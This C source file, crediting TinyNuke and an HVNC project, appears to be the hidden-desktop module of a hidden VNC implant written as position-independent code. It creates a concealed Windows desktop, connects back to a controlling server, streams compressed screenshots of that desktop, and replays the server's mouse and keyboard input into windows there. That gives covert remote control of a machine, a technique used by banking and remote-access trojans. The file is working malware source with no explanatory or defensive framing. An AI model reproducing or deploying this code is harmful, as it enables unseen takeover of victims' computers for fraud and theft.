// https://github.com/rossja/TinyNuke
// https://github.com/Meltedd/HVNC

#include "common.h"

#define FREE( x ) if( x ) { pArgs->pApi->msvcrt.free( x ); x = NULL; }

SECTION( D ) SOCKET connectToServer( PARGS pArgs )
{
    WSADATA     wsa;
    SOCKET      s;
    SOCKADDR_IN addr;
    PHOSTENT    he;

    if ( pArgs->pApi->ws2_32.WSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
    {
        return INVALID_SOCKET;
    };

    s = pArgs->pApi->ws2_32.socket( AF_INET, SOCK_STREAM, 0 );
    if( s == INVALID_SOCKET )
    {
        return INVALID_SOCKET;
    };

    he = pArgs->pApi->ws2_32.gethostbyname( C_PTR( OFFSET( "127.0.0.1" ) ) );
    if( he == NULL )
    {
        return INVALID_SOCKET;
    };

    memcpy( &addr.sin_addr, he->h_addr_list[0], he->h_length );
    addr.sin_family = AF_INET;
    addr.sin_port = pArgs->pApi->ws2_32.htons( pArgs->port );

    if( pArgs->pApi->ws2_32.connect( s, ( PSOCKADDR )&addr, sizeof( addr ) ) < 0 )
    {
        return INVALID_SOCKET;
    };

    return s;
};

SECTION( D ) INT sendInt( SOCKET s, INT i, PAPI pApi )
{
    return pApi->ws2_32.send( s, ( PCHAR )&i, sizeof( i ), 0 );
};

SECTION( D ) BOOL paintWindow( HWND hWnd, HDC hDc, HDC hDcScreen, PAPI pApi )
{
    BOOL ret = FALSE;
    RECT rect;
    pApi->user32.GetWindowRect( hWnd, &rect );

    HDC     hDcWindow = pApi->gdi32.CreateCompatibleDC( hDc );
    HBITMAP hBmpWindow = pApi->gdi32.CreateCompatibleBitmap( hDc, rect.right - rect.left, rect.bottom - rect.top );

    pApi->gdi32.SelectObject( hDcWindow, hBmpWindow );
    if ( pApi->user32.PrintWindow( hWnd, hDcWindow, 0 ) )
    {
        pApi->gdi32.BitBlt( hDcScreen,
            rect.left,
            rect.top,
            rect.right - rect.left,
            rect.bottom - rect.top,
            hDcWindow,
            0,
            0,
            SRCCOPY );

        ret = TRUE;
    };

    pApi->gdi32.DeleteObject( hBmpWindow );
    pApi->gdi32.DeleteDC( hDcWindow );
    return ret;
};

SECTION( D ) VOID enumWindows( HWND owner, PICWNDENUMPROC proc, LPARAM param, PAPI pApi )
{
    HWND currentWindow = pApi->user32.GetTopWindow( owner );
    if( currentWindow == NULL )
    {
        return;
    };

    if( ( currentWindow = pApi->user32.GetWindow( currentWindow, GW_HWNDLAST ) ) == NULL )
    {
        return;
    };
    
    while ( proc( currentWindow, param, pApi ) && ( currentWindow = pApi->user32.GetWindow( currentWindow, GW_HWNDPREV ) ) != NULL );
};

SECTION( D ) BOOL CALLBACK enumWindowsCallback( HWND hWnd, LPARAM lParam, PAPI pApi )
{
    PWINDOWS data = ( PWINDOWS )lParam;
    if ( !pApi->user32.IsWindowVisible( hWnd ) )
    {
        return TRUE;
    };

    paintWindow( hWnd, data->hDc, data->hDcScreen, pApi );

    DWORD style = pApi->user32.GetWindowLongA( hWnd, GWL_EXSTYLE );
    pApi->user32.SetWindowLongA( hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED );

    OSVERSIONINFO versionInfo;
    versionInfo.dwOSVersionInfoSize = sizeof( versionInfo );
    pApi->kernel32.GetVersionExA( &versionInfo );
    if ( versionInfo.dwMajorVersion < 6 )
    {
        enumWindows( hWnd, C_PTR( OFFSET( enumWindowsCallback ) ), ( LPARAM )data, pApi );
    };

    return TRUE;
};

SECTION( D ) CLSID getCLSID( UINT l, UINT w1, UINT w2, UINT b1, UINT b2, UINT b3, UINT b4, UINT b5, UINT b6, UINT b7, UINT b8 )
{
    // trick to stay PIC
    return ( CLSID ){ l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } };
};

SECTION( D ) BOOL bitmapToJpg( PHDC hDc, PHBITMAP hbmpImage, INT width, INT height, PARGS pArgs )
{
    CLSID CLSID_JPEG = getCLSID( 0x557cf401, 0x1a04, 0x11d3, 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e );
    CLSID CLSID_EncoderQuality = getCLSID( 0x1d5be4b5, 0xfa4a, 0x452d, 0x9c, 0xdd, 0x5d, 0xb3, 0x51, 0x05, 0xe7, 0xeb );

    BOOL        ret = FALSE;
    HBITMAP     compressedImage;
    PGPBITMAP   Image = NULL;
    PISTREAM    jpegStream = NULL;
    PGPBITMAP   JPEG = NULL;
    ENCODERPRM  encoder = { 0 };

    if( pArgs->gdiplusToken == 0 )
    {
        GdiplusStartupInput gdiplusStartupInput;

        gdiplusStartupInput.GdiplusVersion = 1;
        gdiplusStartupInput.DebugEventCallback = NULL;
        gdiplusStartupInput.SuppressBackgroundThread = FALSE;
        gdiplusStartupInput.SuppressExternalCodecs = FALSE;

        if( pArgs->pApi->gdiplus.GdiplusStartup( &pArgs->gdiplusToken, &gdiplusStartupInput, NULL) != Ok )
        {
            goto cleanup;
        };
    };

    pArgs->pApi->gdi32.SelectObject( *hDc, hbmpImage ); 
    pArgs->pApi->gdi32.BitBlt( *hDc, 0, 0, width, height, pArgs->pApi->user32.GetDC( 0 ), 0, 0, SRCCOPY );
    pArgs->pApi->ole32.CreateStreamOnHGlobal( NULL, TRUE, &jpegStream );

    if( pArgs->pApi->gdiplus.GdipCreateBitmapFromHBITMAP( *hbmpImage, NULL, &Image ) != Ok )
    {
        goto cleanup;
    };

    encoder.Count = 1;
    encoder.Parameter[0].Guid = CLSID_EncoderQuality;
    encoder.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoder.Parameter[0].NumberOfValues = 1;
    encoder.Parameter[0].Value = &pArgs->quality;

    if( pArgs->pApi->gdiplus.GdipSaveImageToStream( Image, jpegStream, &CLSID_JPEG, &encoder ) != Ok )
    {
        goto cleanup;
    };

    if( pArgs->pApi->gdiplus.GdipCreateBitmapFromStream( jpegStream, &JPEG ) != Ok )
    {
        goto cleanup;
    };

    if( pArgs->pApi->gdiplus.GdipCreateHBITMAPFromBitmap( JPEG, &compressedImage, ( ARGB )0xFFFFFFFF ) != Ok )
    {
        goto cleanup;
    };

    if( pArgs->pApi->gdi32.GetDIBits( *hDc, compressedImage, 0, height, pArgs->pPixels, ( PBITMAPINFO )&pArgs->bmpInfo, DIB_RGB_COLORS ) == 0 )
    {
        goto cleanup;
    };

    ret = TRUE;

cleanup:
    if( compressedImage )
    {
        pArgs->pApi->gdi32.DeleteObject( compressedImage );
    };

    if( JPEG )
    {
        pArgs->pApi->gdiplus.GdipDisposeImage( ( PGPBITMAP )JPEG );
    };

    if( Image )
    {
        pArgs->pApi->gdiplus.GdipDisposeImage( ( PGPBITMAP )Image );
    };

    return ret;
};

SECTION( D ) BOOL getDeskPixels( INT serverWidth, INT serverHeight, PARGS pArgs )
{
    RECT rect;
    HWND hWndDesktop;
    
    hWndDesktop = pArgs->pApi->user32.GetDesktopWindow();
    if( pArgs->pApi->user32.GetWindowRect( hWndDesktop, &rect ) == 0 )
    {
        return FALSE;
    };

    HDC     hDc = pArgs->pApi->user32.GetDC( NULL );
    HDC     hDcScreen = pArgs->pApi->gdi32.CreateCompatibleDC( hDc );
    HBITMAP hBmpScreen = pArgs->pApi->gdi32.CreateCompatibleBitmap( hDc, rect.right, rect.bottom );
    pArgs->pApi->gdi32.SelectObject( hDcScreen, hBmpScreen );

    WINDOWS data;
    data.hDc = hDc;
    data.hDcScreen = hDcScreen;

    enumWindows( NULL, C_PTR( OFFSET( enumWindowsCallback ) ), ( LPARAM )&data, pArgs->pApi );

    if ( serverWidth > rect.right )
    {
        serverWidth = rect.right;
    };
    if ( serverHeight > rect.bottom )
    {
        serverHeight = rect.bottom;
    };

    if ( serverWidth != rect.right || serverHeight != rect.bottom )
    {
        HBITMAP hBmpScreenResized = pArgs->pApi->gdi32.CreateCompatibleBitmap( hDc, serverWidth, serverHeight );
        HDC     hDcScreenResized = pArgs->pApi->gdi32.CreateCompatibleDC( hDc );

        pArgs->pApi->gdi32.SelectObject( hDcScreenResized, hBmpScreenResized );
        pArgs->pApi->gdi32.SetStretchBltMode( hDcScreenResized, HALFTONE );
        pArgs->pApi->gdi32.StretchBlt( hDcScreenResized, 0, 0, serverWidth, serverHeight, hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY );

        pArgs->pApi->gdi32.DeleteObject( hBmpScreen );
        pArgs->pApi->gdi32.DeleteDC( hDcScreen );

        hBmpScreen = hBmpScreenResized;
        hDcScreen = hDcScreenResized;
    };

    BOOL comparePixels = TRUE;
    pArgs->bmpInfo.bmiHeader.biSizeImage = serverWidth * 3 * serverHeight;

    if ( pArgs->pPixels == NULL || ( pArgs->bmpInfo.bmiHeader.biWidth != serverWidth || pArgs->bmpInfo.bmiHeader.biHeight != serverHeight ) )
    {
        pArgs->pApi->msvcrt.free( pArgs->pPixels );
        pArgs->pApi->msvcrt.free( pArgs->pOldPixels );
        pArgs->pApi->msvcrt.free( pArgs->pTempPixels );

        pArgs->pPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );
        pArgs->pOldPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );
        pArgs->pTempPixels = ( PBYTE )pArgs->pApi->msvcrt.malloc( pArgs->bmpInfo.bmiHeader.biSizeImage );

        comparePixels = FALSE;
    };

    pArgs->bmpInfo.bmiHeader.biWidth = serverWidth;
    pArgs->bmpInfo.bmiHeader.biHeight = serverHeight;
    bitmapToJpg( &hDcScreen, &hBmpScreen, serverWidth, serverHeight, pArgs );

    pArgs->pApi->gdi32.DeleteObject( hBmpScreen );
    pArgs->pApi->user32.ReleaseDC( NULL, hDc );
    pArgs->pApi->gdi32.DeleteDC( hDcScreen );

    if ( comparePixels )
    {
        for ( DWORD i = 0; i < pArgs->bmpInfo.bmiHeader.biSizeImage; i += 3 )
        {
            if ( pArgs->pPixels[i] == GetRValue( pArgs->color ) &&
                pArgs->pPixels[i + 1] == GetGValue( pArgs->color ) &&
                pArgs->pPixels[i + 2] == GetBValue( pArgs->color ) )
            {
                ++pArgs->pPixels[i + 1];
            };
        };

        memcpy( pArgs->pTempPixels, pArgs->pPixels, pArgs->bmpInfo.bmiHeader.biSizeImage );

        BOOL same = TRUE;
        for ( DWORD i = 0; i < pArgs->bmpInfo.bmiHeader.biSizeImage - 1; i += 3 )
        {
            if ( pArgs->pPixels[i] == pArgs->pOldPixels[i] &&
                pArgs->pPixels[i + 1] == pArgs->pOldPixels[i + 1] &&
                pArgs->pPixels[i + 2] == pArgs->pOldPixels[i + 2] )
            {
                pArgs->pPixels[i] = GetRValue( pArgs->color);
                pArgs->pPixels[i + 1] = GetGValue( pArgs->color );
                pArgs->pPixels[i + 2] = GetBValue( pArgs->color );

            } else
            {
                same = FALSE;
            };
        };

        if ( same )
        {
            return TRUE;
        };

        memcpy( pArgs->pOldPixels, pArgs->pTempPixels, pArgs->bmpInfo.bmiHeader.biSizeImage );

    } else
    {
        memcpy( pArgs->pOldPixels, pArgs->pPixels, pArgs->bmpInfo.bmiHeader.biSizeImage );
    };

    return FALSE;
};

SECTION( C ) DWORD WINAPI DesktopHandler( PARGS pArgs )
{
    SOCKET s = connectToServer( pArgs );
    if( s == INVALID_SOCKET )
    {
        goto cleanup;
    };

    if( !pArgs->pApi->user32.SetThreadDesktop( pArgs->hDesktop ) )
    {
        goto cleanup;
    };

    if( pArgs->pApi->ws2_32.send( s, C_PTR( OFFSET( "WKLWKL" ) ), 7, 0 ) <= 0 )
    {
        goto cleanup;
    };

    if( sendInt( s, desktop, pArgs->pApi ) <= 0 )
    {
        goto cleanup;
    };

    for( ;; )
    {
        INT width, height;

        if ( pArgs->pApi->ws2_32.recv( s, ( PCHAR )&width, sizeof( width ), 0 ) <= 0 )
        {
            goto cleanup;
        };

        if ( pArgs->pApi->ws2_32.recv( s, ( PCHAR )&height, sizeof( height ), 0 ) <= 0 )
        {
            goto cleanup;
        };

        BOOL same = getDeskPixels( width, height, pArgs );
        if ( same )
        {
            if ( sendInt( s, 0, pArgs->pApi ) <= 0 )
            {
                goto cleanup;
            };

            continue;
        };

        if ( sendInt(s, 1, pArgs->pApi ) <= 0 )
        {
            goto cleanup;
        };

        DWORD workSpaceSize;
        DWORD fragmentWorkSpaceSize;
        pArgs->pApi->ntdll.RtlGetCompressionWorkSpaceSize( COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize );
        PBYTE workSpace = ( PBYTE )pArgs->pApi->msvcrt.malloc( workSpaceSize );

        DWORD size;
        pArgs->pApi->ntdll.RtlCompressBuffer( COMPRESSION_FORMAT_LZNT1, 
            pArgs->pPixels, 
            pArgs->bmpInfo.bmiHeader.biSizeImage, 
            pArgs->pTempPixels, 
            pArgs->bmpInfo.bmiHeader.biSizeImage, 
            2048, 
            &size, 
            workSpace );

        pArgs->pApi->msvcrt.free( workSpace );

        RECT rect;
        HWND hWndDesktop = pArgs->pApi->user32.GetDesktopWindow();
        if( pArgs->pApi->user32.GetWindowRect( hWndDesktop, &rect ) == 0 )
        {
            goto cleanup;
        };

        if( sendInt( s, rect.right, pArgs->pApi ) <= 0 )
        {
            goto cleanup;
        };

        if(sendInt(s, rect.bottom, pArgs->pApi ) <= 0)
        {
            goto cleanup;
        };

        if( sendInt( s, pArgs->bmpInfo.bmiHeader.biWidth, pArgs->pApi ) <= 0 )
        {
            goto cleanup;
        };

        if ( sendInt( s, pArgs->bmpInfo.bmiHeader.biHeight, pArgs->pApi ) <= 0)
        {
            goto cleanup;
        };

        if ( sendInt(s, size, pArgs->pApi ) <= 0 )
        {
            goto cleanup;
        };

        if ( pArgs->pApi->ws2_32.send( s, ( PCHAR )pArgs->pTempPixels, size, 0 ) <= 0 )
        {
            goto cleanup;
        };

        DWORD response;
        if ( pArgs->pApi->ws2_32.recv(s, ( PCHAR )&response, sizeof( response ), 0) <= 0 )
        {
            goto cleanup;
        };
    };

cleanup:
    if( s != INVALID_SOCKET )
    {
        pArgs->pApi->ws2_32.closesocket( s );
    };

    return 0;
};

SECTION( B ) DWORD WINAPI InputHandler( PARGS *ppArgs )
{
    PARGS   pArgs = *ppArgs;
    HANDLE  hDesktopThread = NULL;
    SOCKET  s = INVALID_SOCKET;
    DWORD   response;

    POINT   lastPoint;
    BOOL    lmouseDown = FALSE;
    HWND    hResMoveWindow = NULL;
    LRESULT resMoveType = 0;

    pArgs->log = PipeInit( pArgs->pApi, pArgs->pPipeName );
    if( pArgs->log == INVALID_HANDLE_VALUE )
    {
        goto cleanup;
    };

    if( !PipeWait( pArgs->pApi, pArgs->log ) )
    {
        goto cleanup;
    };

    PipePrint( pArgs->pApi, pArgs->log, C_PTR( OFFSET( "HD connected to pipe\n" ) ) );

    RtlSecureZeroMemory( &pArgs->bmpInfo, sizeof( BITMAPINFO ) );
    pArgs->bmpInfo.bmiHeader.biSize = sizeof( BITMAPINFOHEADER );
    pArgs->bmpInfo.bmiHeader.biPlanes = 1;
    pArgs->bmpInfo.bmiHeader.biBitCount = 24;
    pArgs->bmpInfo.bmiHeader.biCompression = BI_RGB;
    pArgs->bmpInfo.bmiHeader.biClrUsed = 0;
    pArgs->color = RGB( 255, 174, 201 );
    pArgs->quality = 10;

    pArgs->hDesktop = pArgs->pApi->user32.OpenDesktopA( pArgs->pDesktopName, 0, TRUE, GENERIC_ALL );
    if( pArgs->hDesktop == NULL )
    {
        pArgs->hDesktop = pArgs->pApi->user32.CreateDesktopA( pArgs->pDesktopName, NULL, NULL, 0, GENERIC_ALL, NULL );
        if( pArgs->hDesktop == NULL )
        {
            goto cleanup;
        };
    };

    s = connectToServer( pArgs );
    if( s == INVALID_SOCKET )
    {
        goto cleanup;
    };

    if( !pArgs->pApi->user32.SetThreadDesktop( pArgs->hDesktop ) )
    {
        goto cleanup;
    };

    if( pArgs->pApi->ws2_32.send( s, C_PTR( OFFSET( "WKLWKL" ) ), 7, 0 ) <= 0 )
    {
        goto cleanup;
    };

    if( sendInt( s, input, pArgs->pApi ) <= 0 )
    {
        goto cleanup;
    };

    if( !pArgs->pApi->ws2_32.recv( s, ( PCHAR )&response, sizeof( response ), 0 ) )
    {
        goto cleanup;
    };

    hDesktopThread = pArgs->pApi->kernel32.CreateThread( NULL, 0, ( LPTHREAD_START_ROUTINE )C_PTR( OFFSET( DesktopHandler ) ), pArgs, 0, NULL );
    if( hDesktopThread == NULL )
    {
        goto cleanup;
    };
    
    lastPoint.x = 0;
    lastPoint.y = 0;

    for( ;; )
    {
        MSGPACKET input;

        if ( pArgs->pApi->ws2_32.recv( s, ( PCHAR )&input, sizeof( input ), 0) <= 0 )
        {
            break;
        };

        HWND  hWnd;
        POINT point;
        POINT lastPointCopy;
        BOOL  mouseMsg = FALSE;

        switch ( input.msg )
        {
            case WM_SET_QUALITY:
            {
                if( input.wParam > 100 )
                {
                    pArgs->quality = 100;

                } else if( input.wParam < 0 )
                {
                    pArgs->quality = 0;

                } else
                {
                    pArgs->quality = input.wParam;
                };

                continue;
            };
            case WM_CHAR:
            case WM_KEYDOWN:
            case WM_KEYUP:
            {
                point = lastPoint;
                hWnd = pArgs->pApi->user32.WindowFromPoint( point );
                break;
            };
            default:
            {
                mouseMsg = TRUE;
                point.x = GET_X_LPARAM( input.lParam );
                point.y = GET_Y_LPARAM( input.lParam );
                lastPointCopy = lastPoint;
                lastPoint = point;

                hWnd = pArgs->pApi->user32.WindowFromPoint( point );
                if ( input.msg == WM_LBUTTONUP )
                {
                    lmouseDown = FALSE;
                    LRESULT lResult = pArgs->pApi->user32.SendMessageA( hWnd, WM_NCHITTEST, 0, input.lParam );

                    switch ( lResult )
                    {
                        case HTTRANSPARENT:
                        {
                            pArgs->pApi->user32.SetWindowLongA( hWnd, GWL_STYLE, pArgs->pApi->user32.GetWindowLongA( hWnd, GWL_STYLE ) | WS_DISABLED );
                            lResult = pArgs->pApi->user32.SendMessageA( hWnd, WM_NCHITTEST, 0, input.lParam );
                            break;
                        };
                        case HTCLOSE:
                        {
                            pArgs->pApi->user32.PostMessageA( hWnd, WM_CLOSE, 0, 0 );
                            break;
                        };
                        case HTMINBUTTON:
                        {
                            pArgs->pApi->user32.PostMessageA( hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0 );
                            break;
                        };
                        case HTMAXBUTTON:
                        {
                            WINDOWPLACEMENT windowPlacement;
                            windowPlacement.length = sizeof( windowPlacement );
                            pArgs->pApi->user32.GetWindowPlacement( hWnd, &windowPlacement );
                            if ( windowPlacement.flags & SW_SHOWMAXIMIZED )
                            {
                                pArgs->pApi->user32.PostMessageA( hWnd, WM_SYSCOMMAND, SC_RESTORE, 0 );

                            } else
                            {
                                pArgs->pApi->user32.PostMessageA( hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0 );
                            };
                            break;
                        };
                    };

                } else if ( input.msg == WM_LBUTTONDOWN || input.msg == WM_MOUSEACTIVATE )
                {
                    lmouseDown = TRUE;
                    hResMoveWindow = NULL;

                    RECT startButtonRect;
                    HWND hStartButton = pArgs->pApi->user32.FindWindowA( C_PTR( OFFSET( "Button" ) ), NULL );
                    pArgs->pApi->user32.GetWindowRect( hStartButton, &startButtonRect );
                    if ( pArgs->pApi->user32.PtInRect( &startButtonRect, point ) )
                    {
                        pArgs->pApi->user32.PostMessageA( hStartButton, BM_CLICK, 0, 0 );
                        continue;

                    } else
                    {
                        CHAR windowClass[MAX_PATH] = { 0 };
                        pArgs->pApi->user32.RealGetWindowClassA( hWnd, windowClass, MAX_PATH );

                        if ( !strcmpA( windowClass, C_PTR( OFFSET( "#32768" ) ) ) )
                        {
                            HMENU hMenu = ( HMENU )pArgs->pApi->user32.SendMessageA( hWnd, MN_GETHMENU, 0, 0 );
                            INT itemPos = pArgs->pApi->user32.MenuItemFromPoint( NULL, hMenu, point );
                            INT itemId = pArgs->pApi->user32.GetMenuItemID( hMenu, itemPos );
                            if ( itemId == -1 )
                            {
                                
                            };

                            pArgs->pApi->user32.PostMessageA( hWnd, 0x1e5, itemPos, 0 );
                            pArgs->pApi->user32.PostMessageA( hWnd, WM_KEYDOWN, VK_RETURN, 0 );

                            continue;
                        };
                    };

                } else if ( input.msg == WM_MOUSEMOVE )
                {
                    if ( !lmouseDown )
                    {
                        continue;
                    };

                    if ( !hResMoveWindow )
                    {
                        resMoveType = pArgs->pApi->user32.SendMessageA( hWnd, WM_NCHITTEST, 0, input.lParam );

                    } else
                    {
                        hWnd = hResMoveWindow;
                    };

                    INT moveX = lastPointCopy.x - point.x;
                    INT moveY = lastPointCopy.y - point.y;

                    RECT rect;
                    pArgs->pApi->user32.GetWindowRect( hWnd, &rect );

                    INT x = rect.left;
                    INT y = rect.top;
                    INT width = rect.right - rect.left;
                    INT height = rect.bottom - rect.top;
                    switch ( resMoveType )
                    {
                        case HTCAPTION:
                        {
                            x -= moveX;
                            y -= moveY;
                            break;
                        };
                        case HTTOP:
                        {
                            y -= moveY;
                            height += moveY;
                            break;
                        };
                        case HTBOTTOM:
                        {
                            height -= moveY;
                            break;
                        };
                        case HTLEFT:
                        {
                            x -= moveX;
                            width += moveX;
                            break;
                        };
                        case HTRIGHT:
                        {
                            width -= moveX;
                            break;
                        };
                        case HTTOPLEFT:
                        {
                            y -= moveY;
                            height += moveY;
                            x -= moveX;
                            width += moveX;
                            break;
                        };
                        case HTTOPRIGHT:
                        {
                            y -= moveY;
                            height += moveY;
                            width -= moveX;
                            break;
                        };
                        case HTBOTTOMLEFT:
                        {
                            height -= moveY;
                            x -= moveX;
                            width += moveX;
                            break;
                        };
                        case HTBOTTOMRIGHT:
                        {
                            height -= moveY;
                            width -= moveX;
                            break;
                        };
                        default:
                        {
                            continue;
                        };
                    };
                    pArgs->pApi->user32.MoveWindow( hWnd, x, y, width, height, FALSE );
                    hResMoveWindow = hWnd;
                    continue;
                };

                break;
            };
        };

        for ( HWND currHwnd = hWnd;; )
        {
            hWnd = currHwnd;
            pArgs->pApi->user32.ScreenToClient( currHwnd, &point );
            currHwnd = pArgs->pApi->user32.ChildWindowFromPoint( currHwnd, point );
            if ( !currHwnd || currHwnd == hWnd )
            {
                break;
            };
        };

        if ( mouseMsg )
        {
            input.lParam = MAKELPARAM( point.x, point.y );
        };

        pArgs->pApi->user32.PostMessageA( hWnd, input.msg, input.wParam, input.lParam );
    };

cleanup:
    if( hDesktopThread != NULL )
    {
        pArgs->pApi->kernel32.WaitForSingleObject( hDesktopThread, INFINITE );
        pArgs->pApi->kernel32.CloseHandle( hDesktopThread );
    };

    PipePrint( pArgs->pApi, pArgs->log, C_PTR( OFFSET( "HD unable to communicate with server. Exiting.\n" ) ) );

    if( pArgs->gdiplusToken != 0 )
    {
        pArgs->pApi->gdiplus.GdiplusShutdown( pArgs->gdiplusToken );
    };

    if( pArgs->hDesktop )
    {

        pArgs->pApi->user32.CloseDesktop( pArgs->hDesktop );
    };

    if( s != INVALID_SOCKET )
    {
        pArgs->pApi->ws2_32.closesocket( s );
    };

    if( pArgs->log != INVALID_HANDLE_VALUE )
    {
        pArgs->pApi->kernel32.CloseHandle( pArgs->log );
    };

    FREE( pArgs->pPipeName )
    FREE( pArgs->pDesktopName );
    FREE( pArgs->pPixels );
    FREE( pArgs->pOldPixels );
    FREE( pArgs->pTempPixels );
    FREE( pArgs->pApi );

    return 0;
};
